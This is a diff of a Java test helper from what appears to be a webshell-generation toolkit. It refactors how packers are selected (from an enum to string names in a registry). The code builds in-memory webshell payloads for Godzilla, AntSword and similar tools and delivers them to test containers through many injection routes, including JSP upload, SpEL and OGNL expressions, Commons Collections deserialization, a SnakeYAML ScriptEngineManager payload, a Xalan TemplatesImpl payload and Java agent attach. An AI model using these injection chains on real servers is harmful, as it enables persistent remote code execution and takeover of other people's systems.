@@ -6,6 +6,7 @@ import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
 import com.reajason.javaweb.godzilla.GodzillaManager;
 import com.reajason.javaweb.memshell.MemShellGenerator;
 import com.reajason.javaweb.memshell.MemShellResult;
+import com.reajason.javaweb.memshell.PackerRegistry;
 import com.reajason.javaweb.memshell.ShellTool;
 import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
@@ -21,6 +22,7 @@ import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Config;
 import com.reajason.javaweb.packer.ClassPackerConfig;
 import com.reajason.javaweb.packer.JarPacker;
 import com.reajason.javaweb.packer.JarPackerConfig;
+import com.reajason.javaweb.packer.Packer;
 import com.reajason.javaweb.packer.Packers;
 import com.reajason.javaweb.packer.jar.*;
 import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
@@ -59,17 +61,17 @@ import static org.junit.jupiter.api.Assertions.assertTrue;
 @Slf4j
 public class ShellAssertion {
 
-    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, Packers packer) {
+    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, String packer) {
         return shellInjectIsOk(url, server, shellType, shellTool, targetJdkVersion, packer, null);
     }
 
     @SneakyThrows
-    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> container) {
+    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, String packer, GenericContainer<?> container) {
         return shellInjectIsOk(url, server, shellType, shellTool, targetJdkVersion, packer, container, null);
     }
 
     @SneakyThrows
-    public static Pair<String, String> getUrls(String url, String shellType, String shellTool, Packers packer) {
+    public static Pair<String, String> getUrls(String url, String shellType, String shellTool, String packer) {
         String shellUrl = url + "/test";
         String urlPattern = null;
         if (shellType.endsWith(ShellType.SERVLET)
@@ -78,12 +80,12 @@ public class ShellAssertion {
                 || shellType.equals(ShellType.SPRING_WEBFLUX_HANDLER_FUNCTION)
                 || shellType.equals(ShellType.ACTION)
         ) {
-            urlPattern = "/" + shellTool + shellType + packer.name();
+            urlPattern = "/" + shellTool + shellType + packer;
             shellUrl = url + urlPattern;
         }
 
         if (shellType.endsWith(ShellType.WEBSOCKET)) {
-            urlPattern = "/" + shellTool + shellType + packer.name();
+            urlPattern = "/" + shellTool + shellType + packer;
             URL url1 = new URL(url);
             shellUrl = "ws://" + url1.getHost() + ":" + url1.getPort() + url1.getPath() + urlPattern;
         }
@@ -91,13 +93,13 @@ public class ShellAssertion {
     }
 
     @SneakyThrows
-    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
+    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, String packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
         return shellInjectIsOk(url, server, null, shellType, shellTool, targetJdkVersion, packer, appContainer, pythonContainer);
     }
 
     @SneakyThrows
     public static MemShellResult shellInjectIsOk(String url, String server, String serverVersion, String shellType, String shellTool,
-                                                 int targetJdkVersion, Packers packer,
+                                                 int targetJdkVersion, String packer,
                                                  GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
         if (ShellTool.Proxy.equals(shellTool)) {
             return null;
@@ -118,19 +120,19 @@ public class ShellAssertion {
     }
 
     @SneakyThrows
-    public static void packerResultAndInject(MemShellResult generateResult, String url, String shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) {
+    public static void packerResultAndInject(MemShellResult generateResult, String url, String shellTool, String shellType, String packer, GenericContainer<?> appContainer) {
         String content = null;
-        if (packer.getInstance() instanceof AgentJarPacker ||
-                packer.getInstance() instanceof AgentJarWithJREAttacherPacker ||
-                packer.getInstance() instanceof AgentJarWithJDKAttacherPacker) {
+        if (PackerRegistry.getInstance().get(packer) instanceof AgentJarPacker ||
+                PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJREAttacherPacker ||
+                PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJDKAttacherPacker) {
             injectAgentJar(generateResult, shellTool, shellType, packer, appContainer);
             return;
         }
-        if (packer.getInstance() instanceof ScriptEngineJarPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
+        if (PackerRegistry.getInstance().get(packer) instanceof ScriptEngineJarPacker) {
+            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
-            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
+            String jarPath = "/" + shellTool + shellType + packer + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
             Files.deleteIfExists(tempJar);
             content = "!!javax.script.ScriptEngineManager [\n" +
@@ -138,11 +140,11 @@ public class ShellAssertion {
                     "    !!java.net.URL [\"file://" + jarPath + "\"]\n" +
                     "  ]]\n" +
                     "]";
-        } else if (packer.getInstance() instanceof GroovyTransformJarPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
+        } else if (PackerRegistry.getInstance().get(packer) instanceof GroovyTransformJarPacker) {
+            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
-            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
+            String jarPath = "/" + shellTool + shellType + packer + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
             Files.deleteIfExists(tempJar);
             VulTool.postIsOk(url + "/fastjson", """
@@ -160,22 +162,22 @@ public class ShellAssertion {
                     "    \"classpathList\":\"file://" + jarPath + "\"\n" +
                     "  }\n" +
                     "}";
-        } else if (packer.getInstance() instanceof XalanAbstractTransletPacker) {
-            String bytes = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
+        } else if (PackerRegistry.getInstance().get(packer) instanceof XalanAbstractTransletPacker) {
+            String bytes = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
             content = "[\"org.apache.xalan.xsltc.trax.TemplatesImpl\",{\"transletName\":\"businessObject\",\"transletBytecodes\":[\"" + bytes + "\"],\"outputProperties\":{}}]";
         } else {
-            content = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
+            content = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
         }
         injectIsOk(url, shellType, shellTool, content, packer, appContainer);
         log.info("send inject payload successfully");
     }
 
-    private static void injectAgentJar(MemShellResult generateResult, String shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) throws IOException, InterruptedException {
-        if (packer.getInstance() instanceof AgentJarPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
+    private static void injectAgentJar(MemShellResult generateResult, String shellTool, String shellType, String packer, GenericContainer<?> appContainer) throws IOException, InterruptedException {
+        if (PackerRegistry.getInstance().get(packer) instanceof AgentJarPacker) {
+            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
-            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
+            String jarPath = "/" + shellTool + shellType + packer + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
             Files.deleteIfExists(tempJar);
             String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout().trim();
@@ -186,11 +188,11 @@ public class ShellAssertion {
                     containsString("ATTACH_ACK"),
                     containsString("JVM response code = 0")
             ));
-        } else if (packer.getInstance() instanceof AgentJarWithJREAttacherPacker || packer.getInstance() instanceof AgentJarWithJDKAttacherPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
+        } else if (PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJREAttacherPacker || PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJDKAttacherPacker) {
+            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
-            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
+            String jarPath = "/" + shellTool + shellType + packer + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
             Files.deleteIfExists(tempJar);
             String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout();
@@ -325,9 +327,9 @@ public class ShellAssertion {
         assertTrue(antSwordManager.getInfo().contains("ok"));
     }
 
-    public static ShellToolConfig getShellToolConfig(String shellType, String shellTool, Packers packer) {
+    public static ShellToolConfig getShellToolConfig(String shellType, String shellTool, String packer) {
         ShellToolConfig shellToolConfig = null;
-        String uniqueName = shellTool + RandomUtils.randomAlphabetic(5) + shellType + RandomUtils.randomAlphabetic(5) + packer.name();
+        String uniqueName = shellTool + RandomUtils.randomAlphabetic(5) + shellType + RandomUtils.randomAlphabetic(5) + packer;
         switch (shellTool) {
             case GodzillaSession:
             case Godzilla:
@@ -381,7 +383,7 @@ public class ShellAssertion {
         return shellToolConfig;
     }
 
-    public static MemShellResult generate(String urlPattern, String server, String serverVersin, String shellType, String shellTool, int targetJdkVersion, ShellToolConfig shellToolConfig, Packers packer) {
+    public static MemShellResult generate(String urlPattern, String server, String serverVersin, String shellType, String shellTool, int targetJdkVersion, ShellToolConfig shellToolConfig, String packer) {
         ShellConfig shellConfig = ShellConfig.builder()
                 .server(server)
                 .serverVersion(serverVersin)
@@ -398,10 +400,11 @@ public class ShellAssertion {
         if (StringUtils.isNotBlank(urlPattern)) {
             injectorConfig.setUrlPattern(urlPattern);
         }
-        if (packer.requiresSpringExpressionPackage()) {
-            injectorConfig.setInjectorClassName(packer.generateSpringExpressionClassName());
+        Packer packerInstance = PackerRegistry.getInstance().get(packer);
+        if (packerInstance.requiresSpringExpressionPackage()) {
+            injectorConfig.setInjectorClassName(packerInstance.generateSpringExpressionClassName());
         }
-        if (packer.requiresSpringExpressionPackage() || packer.transportedAsSpelExpression()) {
+        if (packerInstance.requiresSpringExpressionPackage() || packerInstance.transportedAsSpelExpression()) {
             // SpEL 表达式长度上限 10000 字符，混淆后的注入器放不下；JDK17 系还要求注入器
             // 位于 org.springframework.expression 包下，同样不能改名
             shellConfig.setObfuscation(ObfuscationConfig.defaults());
@@ -409,66 +412,66 @@ public class ShellAssertion {
         return new MemShellGenerator().generate(shellConfig, injectorConfig, shellToolConfig);
     }
 
-    public static void injectIsOk(String url, String shellType, String shellTool, String content, Packers packer, GenericContainer<?> container) {
+    public static void injectIsOk(String url, String shellType, String shellTool, String content, String packer, GenericContainer<?> container) {
         switch (packer) {
-            case JSP, ClassLoaderJSP, ClassLoaderJSPUnicode, DefineClassJSP, DefineClassJSPUnicode -> {
+            case Packers.JSP, Packers.ClassLoaderJSP, Packers.ClassLoaderJSPUnicode, Packers.DefineClassJSP, Packers.DefineClassJSPUnicode -> {
                 String uploadEntry = url + "/upload";
                 String filename = shellType + shellTool + packer + ".jsp";
                 String shellUrl = url + "/" + filename;
                 VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                 VulTool.urlIsOk(shellUrl);
             }
-            case JSPX, JSPXUnicode -> {
+            case Packers.JSPX, Packers.JSPXUnicode -> {
                 String uploadEntry = url + "/upload";
                 String filename = shellType + shellTool + packer + ".jspx";
                 String shellUrl = url + "/" + filename;
                 VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                 VulTool.urlIsOk(shellUrl);
             }
-            case ScriptEngine, DefaultScriptEngine, ScriptEngineNoSquareBrackets, ScriptEngineBigInteger ->
+            case Packers.ScriptEngine, Packers.DefaultScriptEngine, Packers.ScriptEngineNoSquareBrackets, Packers.ScriptEngineBigInteger ->
                     VulTool.postIsOk(url + "/js", content);
-            case EL -> VulTool.postIsOk(url + "/el", content);
-            case SpEL, SpELSpringGzip, SpELScriptEngine, SpELSpringGzipJDK17 ->
+            case Packers.EL -> VulTool.postIsOk(url + "/el", content);
+            case Packers.SpEL, Packers.SpELSpringGzip, Packers.SpELScriptEngine, Packers.SpELSpringGzipJDK17 ->
                     VulTool.postIsOk(url + "/spel", content);
-            case OGNLSpringGzip, OGNLScriptEngine, OGNLSpringGzipJDK17 -> VulTool.postIsOk(url + "/ognl", content);
-            case MVEL -> VulTool.postIsOk(url + "/mvel", content);
-            case JXPath, JXPathScriptEngine, JXPathSpringGzip, JXPathSpringGzipJDK17 ->
+            case Packers.OGNLSpringGzip, Packers.OGNLScriptEngine, Packers.OGNLSpringGzipJDK17 -> VulTool.postIsOk(url + "/ognl", content);
+            case Packers.MVEL -> VulTool.postIsOk(url + "/mvel", content);
+            case Packers.JXPath, Packers.JXPathScriptEngine, Packers.JXPathSpringGzip, Packers.JXPathSpringGzipJDK17 ->
                     VulTool.postIsOk(url + "/jxpath", content);
-            case JEXL -> VulTool.postIsOk(url + "/jexl2", content);
-            case Aviator -> VulTool.postIsOk(url + "/aviator", content);
-            case Groovy -> VulTool.postIsOk(url + "/groovy", content);
-            case Rhino -> VulTool.postIsOk(url + "/rhino", content);
-            case BeanShell -> VulTool.postIsOk(url + "/bsh", content);
-            case JinJava -> VulTool.postIsOk(url + "/jinjava", content);
-            case Freemarker, FreemarkerScriptEngine, FreemarkerSpELSpringGzip, FreemarkerSpELSpringGzipJDK17 -> VulTool.postIsOk(url + "/freemarker", content);
-            case Velocity -> VulTool.postIsOk(url + "/velocity", content);
-            case JavaDeserialize -> VulTool.postIsOk(url + "/java_deserialize", content);
-            case JavaCommonsBeanutils16 -> VulTool.postIsOk(url + "/java_deserialize/cb161", content);
-            case JavaCommonsBeanutils17 -> VulTool.postIsOk(url + "/java_deserialize/cb170", content);
-            case JavaCommonsBeanutils18 -> VulTool.postIsOk(url + "/java_deserialize/cb183", content);
-            case JavaCommonsBeanutils19 -> VulTool.postIsOk(url + "/java_deserialize/cb194", content);
-            case JavaCommonsBeanutils110 -> VulTool.postIsOk(url + "/java_deserialize/cb110", content);
-            case JavaCommonsCollections3 -> VulTool.postIsOk(url + "/java_deserialize/cc321", content);
-            case JavaCommonsCollections4 -> VulTool.postIsOk(url + "/java_deserialize/cc40", content);
-            case HessianDeserialize -> VulTool.postIsOk(url + "/hessian", content);
-            case Hessian2Deserialize -> VulTool.postIsOk(url + "/hessian2", content);
-            case ScriptEngineJar -> VulTool.postIsOk(url + "/snakeYaml", content);
-            case GroovyTransformJar -> VulTool.postIsOk(url + "/fastjson", content);
-            case XMLDecoderScriptEngine, XMLDecoderDefineClass -> VulTool.postIsOk(url + "/xmlDecoder", content);
-            case XSLT, XSLTScriptEngine -> VulTool.postIsOk(url + "/xslt", content);
-            case Base64 -> VulTool.postIsOk(url + "/b64", content);
-            case BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
-            case XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
-            case XxlJobHessian -> VulTool.xxlJobHessianExecutor(url + "/", content);
-            case H2, H2JS, H2Javac, H2JSURLEncode -> VulTool.postIsOk(url + "/jdbc", content);
-            case XalanAbstractTransletPacker -> VulTool.postIsOk(url + "/jackson", content);
+            case Packers.JEXL -> VulTool.postIsOk(url + "/jexl2", content);
+            case Packers.Aviator -> VulTool.postIsOk(url + "/aviator", content);
+            case Packers.Groovy -> VulTool.postIsOk(url + "/groovy", content);
+            case Packers.Rhino -> VulTool.postIsOk(url + "/rhino", content);
+            case Packers.BeanShell -> VulTool.postIsOk(url + "/bsh", content);
+            case Packers.JinJava -> VulTool.postIsOk(url + "/jinjava", content);
+            case Packers.Freemarker, Packers.FreemarkerScriptEngine, Packers.FreemarkerSpELSpringGzip, Packers.FreemarkerSpELSpringGzipJDK17 -> VulTool.postIsOk(url + "/freemarker", content);
+            case Packers.Velocity -> VulTool.postIsOk(url + "/velocity", content);
+            case Packers.JavaDeserialize -> VulTool.postIsOk(url + "/java_deserialize", content);
+            case Packers.JavaCommonsBeanutils16 -> VulTool.postIsOk(url + "/java_deserialize/cb161", content);
+            case Packers.JavaCommonsBeanutils17 -> VulTool.postIsOk(url + "/java_deserialize/cb170", content);
+            case Packers.JavaCommonsBeanutils18 -> VulTool.postIsOk(url + "/java_deserialize/cb183", content);
+            case Packers.JavaCommonsBeanutils19 -> VulTool.postIsOk(url + "/java_deserialize/cb194", content);
+            case Packers.JavaCommonsBeanutils110 -> VulTool.postIsOk(url + "/java_deserialize/cb110", content);
+            case Packers.JavaCommonsCollections3 -> VulTool.postIsOk(url + "/java_deserialize/cc321", content);
+            case Packers.JavaCommonsCollections4 -> VulTool.postIsOk(url + "/java_deserialize/cc40", content);
+            case Packers.HessianDeserialize -> VulTool.postIsOk(url + "/hessian", content);
+            case Packers.Hessian2Deserialize -> VulTool.postIsOk(url + "/hessian2", content);
+            case Packers.ScriptEngineJar -> VulTool.postIsOk(url + "/snakeYaml", content);
+            case Packers.GroovyTransformJar -> VulTool.postIsOk(url + "/fastjson", content);
+            case Packers.XMLDecoderScriptEngine, Packers.XMLDecoderDefineClass -> VulTool.postIsOk(url + "/xmlDecoder", content);
+            case Packers.XSLT, Packers.XSLTScriptEngine -> VulTool.postIsOk(url + "/xslt", content);
+            case Packers.DefaultBase64 -> VulTool.postIsOk(url + "/b64", content);
+            case Packers.BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
+            case Packers.XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
+            case Packers.XxlJobHessian -> VulTool.xxlJobHessianExecutor(url + "/", content);
+            case Packers.H2, Packers.H2JS, Packers.H2Javac, Packers.H2JSURLEncode -> VulTool.postIsOk(url + "/jdbc", content);
+            case Packers.XalanAbstractTransletPacker -> VulTool.postIsOk(url + "/jackson", content);
             default -> throw new IllegalStateException("Unexpected value: " + packer);
         }
     }
 
     public static void testProbeInject(String url, String server, String serverVersion, String shellType, int targetJdkVersion) {
         String shellTool = ShellTool.Command;
-        Packers packer = Packers.BigInteger;
+        String packer = Packers.BigInteger;
         Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
         String shellUrl = urls.getLeft();
         String urlPattern = urls.getRight();
@@ -496,7 +499,7 @@ public class ShellAssertion {
                 .paramName(paramName)
                 .build();
         MemShellResult generateResult = new MemShellGenerator().generate(shellConfig, injectorConfig, commandConfig);
-        String content = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
+        String content = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
         String res = VulTool.postIsOk(url + "/biginteger", content);
         assertThat(res, anyOf(
                 Matchers.containsString("context: "),
@@ -522,7 +525,7 @@ public class ShellAssertion {
     @SneakyThrows
     public static void testListProcessAndAttachAll(String url, ContainerTestConfig config, String shellType, GenericContainer<?> appContainer) {
         String shellTool = ShellTool.Command;
-        Packers packer = Packers.AgentJarWithJREAttacher;
+        String packer = Packers.AgentJarWithJREAttacher;
         Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
         String shellUrl = urls.getLeft();
         String urlPattern = urls.getRight();
@@ -532,7 +535,7 @@ public class ShellAssertion {
                 shellType, shellTool, config.getTargetJdkVersion(), shellToolConfig, packer);
 
         // Pack and copy to container
-        byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
+        byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
         Path tempJar = Files.createTempFile("temp", "jar");
         Files.write(tempJar, bytes);
         String jarPath = "/listProcessTest.jar";
